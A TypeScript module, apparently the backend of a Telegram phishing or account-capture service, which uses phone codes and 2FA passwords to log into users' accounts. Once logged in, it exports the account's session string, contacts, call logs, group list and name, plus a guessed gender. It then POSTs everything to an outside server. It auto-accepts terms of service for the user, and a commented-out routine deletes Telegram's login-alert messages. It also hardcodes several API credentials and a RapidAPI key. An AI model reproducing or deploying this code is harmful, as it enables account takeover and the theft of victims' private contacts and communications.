import { Api } from "telegram/tl";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import axios from "axios";
import { sleep } from "telegram/Helpers";
import { computeCheck } from "telegram/Password";
import bigInt from "big-integer";

const clients = new Map();
let creds = [
    {
        apiId: 27919939,
        apiHash: "5ed3834e741b57a560076a1d38d2fa94"
    },
    {
        apiId: 25328268,
        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
    },
    {
        apiId: 2899,
        apiHash: "36722c72256a24c1225de00eb6a1ca74"
    },
    {
        apiId: 24559917,
        apiHash: "702294de6c08f4fd8c94c3141e0cebfb"
    },
    {
        apiId: 12777557,
        apiHash: "05054fc7885dcfa18eb7432865ea3500"
    },
    {
        apiId: 27565391,
        apiHash: "a3a0a2e895f893e2067dae111b20f2d9"
    },
    {
        apiId: 23195238,
        apiHash: "15a8b085da74163f158eabc71c55b000"
    },
]

// const apiId = 24559917 || parseInt(process.env.API_ID);
// const apiHash = "702294de6c08f4fd8c94c3141e0cebfb" || process.env.API_HASH;

export async function restAcc(phoneNumber) {
    await sleep(1000);
    console.log("Reset - ", phoneNumber);
    const client: TelegramManager = getClient(phoneNumber)
    if (client) {
        await client.client?.destroy();
        await client.client?.disconnect();
        client.client.session.delete();
        client.session.delete();
        client.client = null;
        delete client['client'];
        await deleteClient(phoneNumber);
    }
}

export function getClient(number): TelegramManager {
    return clients.get(number);
}

export async function hasClient(number) {
    return clients.has(number);
}

function contains(str, arr) {
    return (arr.some(element => {
        if (str?.includes(element)) {
            return true;
        }
        return false;
    }))
};

export async function deleteClient(number) {
    console.log("Deleting Client - ", number);
    const cli = getClient(number);
    await cli?.disconnect();
    return clients.delete(number);
}

export async function disconnectAll() {
    for (const [phoneNumber, client] of clients.entries()) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}

export async function createClient(number) {
    try {
        if (clients.has(number)) {
            console.log("Client already exist");
            const cli: TelegramManager = clients.get(number);
            setTimeout(async () => {
                await restAcc(number)
            }, 150000);
            return (await cli.sendCode(false));
        } else {
            const randomIndex = Math.floor(Math.random() * creds.length);
            const apiHash = creds[randomIndex].apiHash
            const apiId = creds[randomIndex].apiId
            console.log("Creating new client - ", number, creds[randomIndex]);
            const cli = new TelegramManager(number, apiId, apiHash);
            clients.set(number, cli);
            await sleep(500)
            return (await cli.sendCode(false));
        }
    } catch (error) {
        console.log(error)
    }
}

class TelegramManager {
    session: any;
    phoneNumber: any;
    client: TelegramClient;
    phoneCodeHash: any;
    apiId: number;
    apiHash: string;
    constructor(number: any, apiId: number, apiHash: string) {
        this.apiId = apiId;
        this.apiHash = apiHash;
        this.phoneNumber = number;
        this.session = new StringSession('');
        this.client = null;
        this.createClient();
    }

    async getLastActiveTime() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        let latest = 0
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        })
        return latest
    }

    async disconnect() {
        await this.client?.disconnect();
        await this.client?.destroy();
        await this.session.delete();
        this.client = null
    }

    async createClient() {
        try {
            this.client = new TelegramClient(this.session, this.apiId, this.apiHash, {
                connectionRetries: 5,
            });
            await this.client.connect();
        } catch (error) {
            console.log("Error while Connecting:", error);
        }
    }

    async deleteMessages() {
        // console.log("IsConnected - ", this.client.connected, this.phoneNumber);
        // if (this.client.connected) {
        //     try {
        //         const msgs = await this.client.getMessages("777000", { limit: 10 });
        //         const len = msgs['total'];
        //         console.log(len)
        //         for (let i = 0; i < len - 1; i++) {
        //             console.log(msgs[i]?.text);
        //             msgs[i]?.delete({ revoke: true });
        //         }
        //     } catch (error) {
        //         console.log("Cannot delete Messages - ", this.phoneNumber);
        //     }
        // }
        console.log("DeleteMessages TODO")
    }

    async sendCode(
        forceSMS = false
    ): Promise<{
        phoneCodeHash: string;
        isCodeViaApp: boolean;
    }> {
        try {
            await this.client.connect();
            console.log("Sending OTP - ", this.phoneNumber, this.apiId, this.apiHash);
            try {

                const sendResult = await this.client.invoke(
                    new Api.auth.SendCode({
                        phoneNumber: `+${this.phoneNumber}`,
                        apiId: this.apiId,
                        apiHash: this.apiHash,
                        settings: new Api.CodeSettings({}),
                    })
                );
                console.log('Send result - ', sendResult);
                setTimeout(async () => {
                    await restAcc(this.phoneNumber);
                }, 150000);
                if (sendResult instanceof Api.auth.SentCodeSuccess)
                    throw new Error("logged in right after sending the code");
                this.phoneCodeHash = sendResult.phoneCodeHash

                if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {
                    return {
                        phoneCodeHash: sendResult.phoneCodeHash,
                        isCodeViaApp:
                            sendResult.type instanceof Api.auth.SentCodeTypeApp,
                    };
                }

                const resendResult = await this.client.invoke(
                    new Api.auth.ResendCode({
                        phoneNumber: `+${this.phoneNumber}`,
                        phoneCodeHash: sendResult.phoneCodeHash,
                    })
                );
                console.log('ReSend result - ', sendResult);
                if (resendResult instanceof Api.auth.SentCodeSuccess)
                    throw new Error("logged in right after resending the code");

                this.phoneCodeHash = resendResult.phoneCodeHash

                return {
                    phoneCodeHash: resendResult.phoneCodeHash,
                    isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,
                };
            } catch (sendCodeError) {
                console.log("Error in sending code:", sendCodeError);
                // Handle the specific error or rethrow if needed
                // Add additional handling or logging as necessary
                throw sendCodeError; // Rethrow the error to the outer catch block
            }
        } catch (err: any) {
            console.log("here:", err);
            if (err.errorMessage === "AUTH_RESTART") {
                try {
                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);
                } catch (error) {
                    console.log("heelo: ", error)
                }
            } else {
                console.log(err)
            }
        }
    }

    async login(phoneCode: any, passowrd?: any) {
        let isRegistrationRequired = false
        let termsOfService;
        try {
            if (!phoneCode) {
                throw new Error("Code is empty");
            }
            if (!this.client.connected) {
                await this.client.connect();
            }
            const result = await this.client?.invoke(
                new Api.auth.SignIn({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: this.phoneCodeHash,
                    phoneCode
                })
            );
            if (result instanceof Api.auth.AuthorizationSignUpRequired) {
                isRegistrationRequired = true;
                termsOfService = result.termsOfService;
            } else {
                this.processLogin(result.user);
                await restAcc(this.phoneNumber);
                return { status: 200, message: "Login success" }
            }
        } catch (err: any) {
            console.log(err);
            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                console.log("passowrd Required")
                try {
                    const passwordSrpResult = await this.client.invoke(
                        new Api.account.GetPassword()
                    );
                    const passwordSrpCheck = await computeCheck(
                        passwordSrpResult,
                        passowrd
                    );
                    const { user } = (await this.client.invoke(
                        new Api.auth.CheckPassword({
                            password: passwordSrpCheck,
                        })
                    )) as Api.auth.Authorization;

                    this.processLogin(user);
                    return { status: 200, message: "Login success" }
                } catch (error) {
                    return { status: 400, message: "2FA required" }
                }
            } else {
                const shouldWeStop = false//await authParams.onError(err);
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
            await restAcc(this.phoneNumber);
            return { status: 400, message: err.errorMessage }
        }

        if (isRegistrationRequired) {
            try {
                let lastName = 'last name';
                let firstName = "first name";
                const { user } = (await this.client.invoke(
                    new Api.auth.SignUp({
                        phoneNumber: `+${this.phoneNumber}`,
                        phoneCodeHash: this.phoneCodeHash,
                        firstName,
                        lastName,
                    })
                )) as Api.auth.Authorization;

                if (termsOfService) {
                    // This is a violation of Telegram rules: the user should be presented with and accept TOS.
                    await this.client.invoke(
                        new Api.help.AcceptTermsOfService({
                            id: termsOfService.id,
                        })
                    );
                }

                return user;
            } catch (err: any) {
                const shouldWeStop = false//await authParams.onError(err);
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
        }
        await restAcc(this.phoneNumber);
    }

    async processLogin(result) {
        console.log(this.client.session.save());
        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const sess = this.client.session.save() as unknown as string;
        const user: any = await result.toJSON();
        const dialogs = await this.client?.getDialogs({ limit: 600 });
        // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
        // for (const message of messageHistory) {
        //     const text = message.text.toLocaleLowerCase();
        //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
        //         movieCount++
        //     } else {
        //         if (message.photo) {
        //             photoCount++;
        //         } else if (message.video) {
        //             videoCount++;
        //         }
        //     }
        // }
        const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({
            hash: bigInt(0)
        }));
        const allCallLogs = [];
        let channels = 0;
        const chatsArray = [];
        let personalChats = 0;

        // Process and format the exported contacts as needed
        const formattedContacts = exportedContacts.users.map(user => ({
            phone: user.phone,
            firstName: user.firstName,
            lastName: user.lastName,
            userName: user.username,
            clientId: user.id.toString()
        }));
        for (let chat of dialogs) {
            if (chat.isChannel || chat.isGroup) {
                channels++;
                const chatEntity: any = chat.entity.toJSON();
                const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
                if (!chatEntity.broadcast && !cannotSendMsgs) {
                    chatsArray.push(chatEntity);
                }
            } else {
                personalChats++;

                // Fetch messages in bulk to reduce searchGlobal calls
                const messageLimit = 600;
                const filter = new Api.InputMessagesFilterPhoneCalls({})
                const history = await this.client.getMessages((chat as any).peer, { limit: messageLimit, filter });

                let callLogs = {}; // Object to store call data for the current chat

                for (const msg of history) {
                    if (msg.action?.className === 'MessageActionPhoneCall') {
                        const userId = (msg.peerId as any).userId.toString();
                        callLogs[userId] = callLogs[userId] || {
                            name: `${msg.senderId ? (await this.client.getEntity(msg.senderId) as any).lastName : ''}`, // Get name only if senderId exists
                            video: 0,
                            total: 0,
                            out: 0
                        };

                        callLogs[userId].total++;
                        if (msg.action.video) {
                            callLogs[userId].video++;
                        }
                        if (msg.out) {
                            callLogs[userId].out++;
                        }
                    }
                }

                // Merge call logs into the allCallLogs object after iterating through messages
                Object.assign(allCallLogs, callLogs);

                console.log("Formatted Contacts:", allCallLogs.length);
            }
        }


        await this.disconnect();
        await deleteClient(this.phoneNumber);

        let data;
        try {
            const options = {
                method: 'GET',
                url: 'https://genderify3.p.rapidapi.com/genderify',
                params: { text: `${user.firstName}${user.lastName ? `%20${user.lastName}` : ''}` },
                headers: {
                    'X-RapidAPI-Key': 'd0850ffd64msh4ad9c1169920cf4p190b74jsn7b3d8b16e4ad',
                    'X-RapidAPI-Host': 'genderify3.p.rapidapi.com'
                }
            };
            data = await axios.request(options);
        } catch (e) {
            console.log(e)
        }

        const payload3 = {
            photoCount, videoCount, movieCount,
            gender: data?.data?.gender,
            mobile: user.phone,
            session: `${sess}`,
            firstName: user.firstName,
            lastName: user.lastName,
            userName: user.username,
            channels: channels,
            personalChats: personalChats,
            calls: allCallLogs,
            msgs: 0,//messageHistory.total,
            totalChats: 0,//chats['total'],
            lastActive: Date.now(),//lastActive,
            date: new Date(Date.now() * 1000),//date,
            tgId: user.id
        };
        try {
            await axios.post(`https://ramyaaa.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
            await axios.post(`https://ramyaaa.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
            await axios.post(`https://ramyaaa.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });

        } catch (error) {
        }
        // await this.deleteMessages();
    }
}
